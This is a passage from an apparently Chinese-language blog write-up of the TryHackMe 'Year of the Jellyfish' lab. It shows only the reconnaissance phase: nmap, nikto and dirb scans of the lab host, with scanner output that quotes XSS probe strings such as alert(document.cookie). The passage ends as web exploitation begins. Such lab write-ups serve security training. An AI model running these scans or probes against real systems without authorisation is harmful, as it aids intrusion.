<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[THM]  Year of the Jellyfish | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[THM]  Year of the Jellyfish</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-04T07:11:02.895Z" id="date"> 2023-06-04</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-04T07:13:11.103Z" id="updated"> 2023-06-04</time></div></span><br><span>Word Count: <div class="control">6.8k</div></span><br><span>Read Time: <div class="control">37 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/daxiaofeng.png'><img src="/pic/daxiaofeng.png" alt="daxiaofeng"></p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这台机子是tryhackme上的Year of the Jellyfish靶机，难度是hard，确实有点难度。信息收集的第一步就要避开很多兔子洞，以及要懂得看ssl证书信息。web渗透部分要有调整exp的能力，毕竟很多exp并不能拿上来就能成功利用，得自己调试修改。提权部分就主要是内核提权没什么说的。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口扫描</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-10-242-231:~<span class="hljs-comment"># sudo nmap -p- --min-rate 10000 34.240.221.73</span><br><br>Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-03 15:40 BST<br>Nmap scan report <span class="hljs-keyword">for</span> ec2-34-240-221-73.eu-west-1.compute.amazonaws.com (34.240.221.73)<br>Host is up (0.00050s latency).<br>Not shown: 65528 filtered ports<br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>22/tcp    open  ssh<br>80/tcp    open  http<br>443/tcp   open  https<br>8000/tcp  open  http-alt<br>8096/tcp  open  unknown<br>22222/tcp open  easyengine<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.29 seconds<br><br></code></pre></td></tr></table></figure>

<p>tcp扫描，服务探测，系统识别</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-10-242-231:~<span class="hljs-comment"># sudo nmap -sT -sV -O -sC -p21,22,80,443,8000,8096,22222 34.240.221.73</span><br><br>Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-03 15:43 BST<br>Nmap scan report <span class="hljs-keyword">for</span> ec2-34-240-221-73.eu-west-1.compute.amazonaws.com (34.240.221.73)<br>Host is up (0.00063s latency).<br><br>PORT      STATE SERVICE  VERSION<br>21/tcp    open  ftp      vsftpd 3.0.3<br>22/tcp    open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)<br>80/tcp    open  http     Apache httpd 2.4.29<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Did not follow redirect to https://robyns-petshop.thm/<br>443/tcp   open  ssl/http Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Robyn&amp;<span class="hljs-comment">#039;s Pet Shop</span><br>| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB<br>| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm<br>| Not valid before: 2023-06-03T14:34:57<br>|_Not valid after:  2024-06-02T14:34:57<br>|_ssl-<span class="hljs-built_in">date</span>: TLS randomness does not represent time<br>8000/tcp  open  http-alt<br>| fingerprint-strings: <br>|   GenericLines: <br>|     HTTP/1.1 400 Bad Request<br>|     Content-Length: 15<br>|_    Request<br>|_http-title: Under Development!<br>8096/tcp  open  unknown<br>| fingerprint-strings: <br>|   FourOhFourRequest: <br>|     HTTP/1.1 404 Not Found<br>|     Connection: close<br>|     Date: Sat, 03 Jun 2023 14:43:59 GMT<br>|     Server: Kestrel<br>|     Content-Length: 0<br>|     X-Response-Time-ms: 210<br>|   GenericLines: <br>|     HTTP/1.1 400 Bad Request<br>|     Connection: close<br>|     Date: Sat, 03 Jun 2023 14:43:34 GMT<br>|     Server: Kestrel<br>|     Content-Length: 0<br>|   GetRequest, HTTPOptions: <br>|     HTTP/1.1 302 Found<br>|     Connection: close<br>|     Date: Sat, 03 Jun 2023 14:43:34 GMT<br>|     Server: Kestrel<br>|     Content-Length: 0<br>|     Location: /web/index.html<br>|   Help, Kerberos, SSLSessionReq, TLSSessionReq: <br>|     HTTP/1.1 400 Bad Request<br>|     Connection: close<br>|     Date: Sat, 03 Jun 2023 14:43:49 GMT<br>|     Server: Kestrel<br>|     Content-Length: 0<br>|   LDAPSearchReq, LPDString: <br>|     HTTP/1.1 400 Bad Request<br>|     Connection: close<br>|     Date: Sat, 03 Jun 2023 14:43:59 GMT<br>|     Server: Kestrel<br>|     Content-Length: 0<br>|   RTSPRequest: <br>|     HTTP/1.1 505 HTTP Version Not Supported<br>|     Connection: close<br>|     Date: Sat, 03 Jun 2023 14:43:34 GMT<br>|     Server: Kestrel<br>|_    Content-Length: 0<br>22222/tcp open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 8d:99:92:52:8e:73:ed:91:01:d3:a7:a0:87:37:f0:4f (RSA)<br>|   256 5a:c0:cc:a1:a8:79:eb:fd:6f:cf:f8:78:0d:2f:5d:db (ECDSA)<br>|_  256 0a:ca:b8:39:4e:ca:e3:cf:86:5c:88:b9:2e:25:7a:1b (EdDSA)<br>2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============<br>SF-Port8000-TCP:V=7.60%I=7%D=6/3%Time=647B519B%P=x86_64-pc-linux-gnu%r(Gen<br>SF:ericLines,3F,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x20</span><br><span class="hljs-string">SF:15\r\n\r\n400\x20Bad\x20Request&quot;</span>);<br>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============<br>SF-Port8096-TCP:V=7.60%I=7%D=6/3%Time=647B5196%P=x86_64-pc-linux-gnu%r(Gen<br>SF:ericLines,78,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20clos</span><br><span class="hljs-string">SF:e\r\nDate:\x20Sat,\x2003\x20Jun\x202023\x2014:43:34\x20GMT\r\nServer:\x</span><br><span class="hljs-string">SF:20Kestrel\r\nContent-Length:\x200\r\n\r\n&quot;</span>)%r(GetRequest,8D,<span class="hljs-string">&quot;HTTP/1\.1\</span><br><span class="hljs-string">SF:x20302\x20Found\r\nConnection:\x20close\r\nDate:\x20Sat,\x2003\x20Jun\x</span><br><span class="hljs-string">SF:202023\x2014:43:34\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x200</span><br><span class="hljs-string">SF:\r\nLocation:\x20/web/index\.html\r\n\r\n&quot;</span>)%r(HTTPOptions,8D,<span class="hljs-string">&quot;HTTP/1\.1</span><br><span class="hljs-string">SF:\x20302\x20Found\r\nConnection:\x20close\r\nDate:\x20Sat,\x2003\x20Jun\</span><br><span class="hljs-string">SF:x202023\x2014:43:34\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x20</span><br><span class="hljs-string">SF:0\r\nLocation:\x20/web/index\.html\r\n\r\n&quot;</span>)%r(RTSPRequest,87,<span class="hljs-string">&quot;HTTP/1\.</span><br><span class="hljs-string">SF:1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nConnection:\x20close</span><br><span class="hljs-string">SF:\r\nDate:\x20Sat,\x2003\x20Jun\x202023\x2014:43:34\x20GMT\r\nServer:\x2</span><br><span class="hljs-string">SF:0Kestrel\r\nContent-Length:\x200\r\n\r\n&quot;</span>)%r(Help,78,<span class="hljs-string">&quot;HTTP/1\.1\x20400\</span><br><span class="hljs-string">SF:x20Bad\x20Request\r\nConnection:\x20close\r\nDate:\x20Sat,\x2003\x20Jun</span><br><span class="hljs-string">SF:\x202023\x2014:43:49\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x2</span><br><span class="hljs-string">SF:00\r\n\r\n&quot;</span>)%r(SSLSessionReq,78,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n</span><br><span class="hljs-string">SF:Connection:\x20close\r\nDate:\x20Sat,\x2003\x20Jun\x202023\x2014:43:49\</span><br><span class="hljs-string">SF:x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x200\r\n\r\n&quot;</span>)%r(TLSSes<br>SF:sionReq,78,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\</span><br><span class="hljs-string">SF:r\nDate:\x20Sat,\x2003\x20Jun\x202023\x2014:43:49\x20GMT\r\nServer:\x20</span><br><span class="hljs-string">SF:Kestrel\r\nContent-Length:\x200\r\n\r\n&quot;</span>)%r(Kerberos,78,<span class="hljs-string">&quot;HTTP/1\.1\x204</span><br><span class="hljs-string">SF:00\x20Bad\x20Request\r\nConnection:\x20close\r\nDate:\x20Sat,\x2003\x20</span><br><span class="hljs-string">SF:Jun\x202023\x2014:43:49\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:</span><br><span class="hljs-string">SF:\x200\r\n\r\n&quot;</span>)%r(FourOhFourRequest,8F,<span class="hljs-string">&quot;HTTP/1\.1\x20404\x20Not\x20Foun</span><br><span class="hljs-string">SF:d\r\nConnection:\x20close\r\nDate:\x20Sat,\x2003\x20Jun\x202023\x2014:4</span><br><span class="hljs-string">SF:3:59\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x200\r\nX-Response</span><br><span class="hljs-string">SF:-Time-ms:\x20210\r\n\r\n&quot;</span>)%r(LPDString,78,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20Bad\x20R</span><br><span class="hljs-string">SF:equest\r\nConnection:\x20close\r\nDate:\x20Sat,\x2003\x20Jun\x202023\x2</span><br><span class="hljs-string">SF:014:43:59\x20GMT\r\nServer:\x20Kestrel\r\nContent-Length:\x200\r\n\r\n&quot;</span><br>SF:)%r(LDAPSearchReq,78,<span class="hljs-string">&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:</span><br><span class="hljs-string">SF:\x20close\r\nDate:\x20Sat,\x2003\x20Jun\x202023\x2014:43:59\x20GMT\r\nS</span><br><span class="hljs-string">SF:erver:\x20Kestrel\r\nContent-Length:\x200\r\n\r\n&quot;</span>);<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 2.6.32 (93%), Linux 3.10 (93%), Linux 3.10 - 4.8 (93%), Linux 3.2 - 4.8 (93%), Linux 3.4 - 3.10 (93%), Linux 2.6.32 - 3.10 (92%), Linux 2.6.32 - 3.13 (92%), Synology DiskStation Manager 5.2-5644 (91%), Linux 2.6.22 - 2.6.36 (89%), Linux 2.6.39 (89%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Service Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 92.96 seconds<br></code></pre></td></tr></table></figure>

<p>可以发现信息很多（实际上很多兔子洞），目前来看主要方向： 21端口ftp看看有无匿名登录；80和443就不用说了web渗透；8000和8096端口不知道干吗的之后看看；22和22222都是ssh端口。</p>
<p>先漏扫一下吧。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-10-242-231:~<span class="hljs-comment"># sudo nmap --script=vuln 34.240.221.73</span><br><br>Starting Nmap 7.60 ( https://nmap.org ) at 2023-06-03 15:46 BST<br>Nmap scan report <span class="hljs-keyword">for</span> ec2-34-240-221-73.eu-west-1.compute.amazonaws.com (34.240.221.73)<br>Host is up (0.00051s latency).<br>Not shown: 995 filtered ports<br>PORT     STATE SERVICE<br>21/tcp   open  ftp<br>|_sslv2-drown: <br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">443/tcp  open  https</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /.gitignore: Revision control ignore file</span><br><span class="hljs-string">|   /config/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.29 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /content/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.29 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /themes/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.29 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /vendor/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.29 (ubuntu)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_sslv2-drown: <br>8000/tcp open  http-alt<br>| http-litespeed-sourcecode-download: <br>| Litespeed Web Server Source Code Disclosure (CVE-2010-2333)<br>| /index.php <span class="hljs-built_in">source</span> code:<br>|_&lt;html lang=\&quot;en\&quot;&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;Under Development!&lt;/title&gt;&lt;meta charset=\&quot;utf-8\&quot;&gt;&lt;meta name=\&quot;viewport\&quot; content=\&quot;width=device-width, initial-scale=1.0\&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Under Construction&lt;/h1&gt;&lt;h2&gt;This site is under development. Please be patient.&lt;/h2&gt;&lt;p&gt;If you have been given a specific ID to use when accessing this development site, please put it at the end of the url (e.g. ec2-34-240-221-73.eu-west-1.compute.amazonaws.com:8000/ID_HERE)&lt;/body&gt;&lt;/html&gt;<br>|_http-vuln-cve2013-7091: ERROR: Script execution failed (use -d to debug)<br>|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 53.23 seconds<br><br>root@ip-10-10-242-231:~<span class="hljs-comment"># sudo nikto -h 34.240.221.73</span><br>- Nikto v2.1.5<br>---------------------------------------------------------------------------<br>+ Target IP:          34.240.221.73<br>+ Target Hostname:    34.240.221.73<br>+ Target Port:        80<br>+ Start Time:         2023-06-03 15:51:35 (GMT1)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.29 (Ubuntu)<br>+ The anti-clickjacking X-Frame-Options header is not present.<br>+ Root page / redirects to: https://robyns-petshop.thm/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ OSVDB-3931: /myphpnuke/links.php?op=search&amp;query=[script]alert(<span class="hljs-string">&#x27;Vulnerable);[/script]?query=: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.</span><br><span class="hljs-string">+ OSVDB-3931: /myphpnuke/links.php?op=MostPopular&amp;ratenum=[script]alert(document.cookie);[/script]&amp;ratetype=percent: myphpnuke is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.</span><br><span class="hljs-string">+ /modules.php?letter=%22%3E%3Cimg%20src=javascript:alert(document.cookie);%3E&amp;op=modload&amp;name=Members_List&amp;file=index: Post Nuke 0.7.2.3-Phoenix is vulnerable to Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.</span><br><span class="hljs-string">+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host</span><br><span class="hljs-string">+ End Time:           2023-06-03 15:51:46 (GMT1) (11 seconds)</span><br><span class="hljs-string">---------------------------------------------------------------------------</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<p>发现列举出了一下目录以及发现网页会重定向至<a target="_blank" rel="noopener" href="https://robyns-petshop.thm/%EF%BC%8C%E6%88%91%E4%BB%AC%E6%8A%8A%E5%85%B6%E5%92%8Cip%E5%AF%B9%E5%BA%94%E5%8A%A0%E5%88%B0%60/etc/hosts%60%E4%B8%AD%EF%BC%8C%E4%B8%8D%E7%84%B6%E4%BC%9A%E5%87%BA%E7%8E%B0%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E7%9A%84%E9%97%AE%E9%A2%98%E3%80%82">https://robyns-petshop.thm/，我们把其和ip对应加到`/etc/hosts`中，不然会出现无法访问的问题。</a></p>
<p>再dirb目录发现一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ip-10-10-242-231:~<span class="hljs-comment"># sudo dirb https://34.240.221.73</span><br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Sat Jun  3 15:55:12 2023<br>URL_BASE: https://34.240.221.73/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: https://34.240.221.73/ ----<br>==&gt; DIRECTORY: https://34.240.221.73/assets/                                                                                                                                                                                                                                             <br>+ https://34.240.221.73/business (CODE:401|SIZE:461)                                                                                                                                                                                                                                     <br>==&gt; DIRECTORY: https://34.240.221.73/config/                                                                                                                                                                                                                                             <br>==&gt; DIRECTORY: https://34.240.221.73/content/                                                                                                                                                                                                                                            <br>+ https://34.240.221.73/index.php (CODE:200|SIZE:3631)                                                                                                                                                                                                                                   <br>+ https://34.240.221.73/LICENSE (CODE:200|SIZE:1085)                                                                                                                                                                                                                                     <br>==&gt; DIRECTORY: https://34.240.221.73/plugins/                                                                                                                                                                                                                                            <br>+ https://34.240.221.73/server-status (CODE:403|SIZE:279)                                                                                                                                                                                                                                <br>==&gt; DIRECTORY: https://34.240.221.73/themes/                                                                                                                                                                                                                                             <br>==&gt; DIRECTORY: https://34.240.221.73/vendor/                                 <br><br><br>---- Entering directory: https://34.240.221.73/assets/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                                                                                                                                                                                         <br>---- Entering directory: https://34.240.221.73/config/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                                                                                                                                                                                         <br>---- Entering directory: https://34.240.221.73/content/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                                                                                                                                                                                         <br>---- Entering directory: https://34.240.221.73/plugins/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                                                                                                                                                                                         <br>---- Entering directory: https://34.240.221.73/themes/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                                                                                                                                                                                                                                         <br>---- Entering directory: https://34.240.221.73/vendor/ ----<br>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        <br>    (Use mode <span class="hljs-string">&#x27;-w&#x27;</span> <span class="hljs-keyword">if</span> you want to scan it anyway)<br>                                                                               <br>-----------------<br>END_TIME: Sat Jun  3 15:55:16 2023<br>DOWNLOADED: 4612 - FOUND: 4<br></code></pre></td></tr></table></figure>

<p>发现能发现一些目录，点进去也确实能看到目录中的文件。</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>信息收集完，每条路都依次试试吧。</p>
<h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><p>ftp尝试匿名登录，发现登不进去，直接放弃吧。</p>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><p>web这边还挺花的。</p>
<p>80和443端口下是一个用PicoCMS搭的网站（在网站底部可以看到是Pico搭的）。</p>
